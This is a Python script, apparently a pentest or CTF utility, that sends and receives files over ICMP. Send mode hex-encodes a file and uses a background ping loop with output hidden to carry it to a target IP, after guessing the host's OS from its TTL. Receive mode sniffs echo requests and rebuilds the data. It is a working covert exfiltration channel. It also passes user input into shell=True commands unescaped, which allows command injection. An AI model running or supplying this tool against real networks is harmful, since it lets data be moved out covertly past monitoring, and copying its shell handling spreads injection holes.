#!/usr/bin/env python3
from scapy.all import *
from colorama import Fore
from tqdm import tqdm
import signal
import subprocess
import sys
import time
import re
import ipaddress


def ctrl_c(signum, frame):
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  Exiting the program...'}")
    time.sleep(1)
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Colours
def get_colours(text, color):
    if color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "green":
        red_color = Fore.GREEN + text
        print(red_color)


def menu_panel():
    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[
        0] + " -i <Adaptor name / IP Address> -m <Mode> -f <Filename>", "green")
    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――",
                'red')
    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network Adaptor name / IP Address'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Mode to use'}")
    print("")
    get_colours(f"\t send", "blue")
    get_colours(f"\t recv", "blue")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-f]'}{Fore.YELLOW + ' File name to save data or to send.'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def data_parser(packet_info):
    if packet_info.haslayer(ICMP):
        if packet_info[ICMP].type == 8:
            byte_data = packet_info['ICMP'].load[-4:].decode('utf-8', errors="ignore")
            print(byte_data, flush=True, end='')
            a = open(f'{sys.argv[6]}.txt', 'a')
            a.write(byte_data)
            a.close()


def send_file(ip_address, file_name):
    try:
        open(file_name, 'rb').readlines()
    except FileNotFoundError:
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Indicate file dosent exist, check file name.'}")
        print(Fore.WHITE)  # To avoid leaving the terminal with colours.
        exit()
    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .001s; done >/dev/null 2>&1 &"""
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  Trying to send file..'}")
    subprocess.run([file_load], shell=True)
    with open(f"{sys.argv[6]}", "r") as f:
        get_file_length = len(f.readlines())
        calc_progress_bar = get_file_length / 3
        progess_bar = 0
        print()
        for i in tqdm(range(int(calc_progress_bar))):
            time.sleep(.1)
            progess_bar += i
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  File sent successfully'}")
    print(Fore.WHITE)


def check_permisson():
    if sys.argv[4] == 'recv':
        if os.getuid() != 0:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                  f"{Fore.RED + ' Run this script with administrator privileges.'}")
            exit()

        check_interface_exist = subprocess.check_output(
            "ip a | grep '%s' | awk '{print $2}' | grep"
            " '%s' | awk '{print $1}' FS=':'" % (
                sys.argv[2], sys.argv[2]),
            shell=True).decode().strip()

        if sys.argv[2] != check_interface_exist:
            print(
                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                f"{Fore.YELLOW + 'Invalid Network Interface name'}")
            get_inters = subprocess.check_output("ls /sys/class/net",
                                                 shell=True).decode().strip()
            save_all = get_inters.split('\n')
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
            cnt = 1
            for i in save_all:
                print(
                    f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                cnt = cnt + 1
            exit()
        else:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                  f"{Fore.BLUE + '  Listening for any incoming connections...'}")
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                  f"{Fore.BLUE + '  Saving data to file'}")
            print(Fore.WHITE)  # To avoid leaving the terminal with colors.
            sniff(iface=f'{sys.argv[2]}', prn=data_parser)
    elif sys.argv[4] == 'send':
        # check for the ip address.
        try:
            ipaddress.ip_address(sys.argv[2])
        except ValueError:
            print(
                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                f"{Fore.YELLOW + 'Invalid IP-Address.'}")
            exit()

        scan_host = subprocess.run([f"timeout 1 ping -c 1 {sys.argv[2]}"], stdout=subprocess.PIPE, shell=True)
        split_ttl = str(scan_host).split()
        try:
            get_ttl_size = split_ttl[18]
            ttl_value = re.findall(r"\d{1,3}", get_ttl_size)[0]
            if "returncode=0" in str(scan_host):
                if int(ttl_value) >= 0 and int(ttl_value) <= 64:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Linux system'}")
                elif int(ttl_value) >= 65 and int(ttl_value) <= 128:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Windows system'}")
            send_file(sys.argv[2], sys.argv[6])
        except IndexError:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                  f"{Fore.RED + ' Host is not active.'}")


def check_parms():
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h":
            menu_panel()
        elif sys.argv[1] == '-i':
            if len(sys.argv) > 2:
                if len(sys.argv) > 3:
                    if sys.argv[3] == '-m':
                        if len(sys.argv) > 4:
                            if len(sys.argv) > 5:
                                if sys.argv[5] == '-f':
                                    if len(sys.argv) > 6:
                                        check_mode = ["send", "recv", ]
                                        if sys.argv[4] not in check_mode:
                                            print(
                                                f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                                f"{Fore.YELLOW + 'Select a valid Mode: '}")
                                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
                                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
                                            print(Fore.WHITE)
                                        else:
                                            check_permisson()  # check for the admin privs
                                    else:
                                        print(
                                            f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                            f"{Fore.YELLOW + 'Missing Filename.'}")
                                else:
                                    print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                          f"{Fore.YELLOW + 'Missing the [-f] parameter.'}")
                            else:
                                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                      f"{Fore.YELLOW + 'Missing the [-f] parameter.'}")
                        else:
                            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                  f"{Fore.YELLOW + 'Select a valid Mode: '}")
                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
                            print(Fore.WHITE)
                    else:
                        print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                              f"{Fore.YELLOW + 'Missing the [-m] parameter.'}")
                        print(Fore.WHITE)
                else:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                          f"{Fore.YELLOW + 'Select a valid Mode: '}")
                    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
                    print(Fore.WHITE)
            else:
                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
                save_all = get_inters.split('\n')
                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
                cnt = 1
                for i in save_all:
                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                    cnt = cnt + 1
                print(Fore.WHITE)
        else:
            print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                  f"{Fore.YELLOW + 'Missing the [-i] parameter.'}")
    else:
        menu_panel()


check_parms()
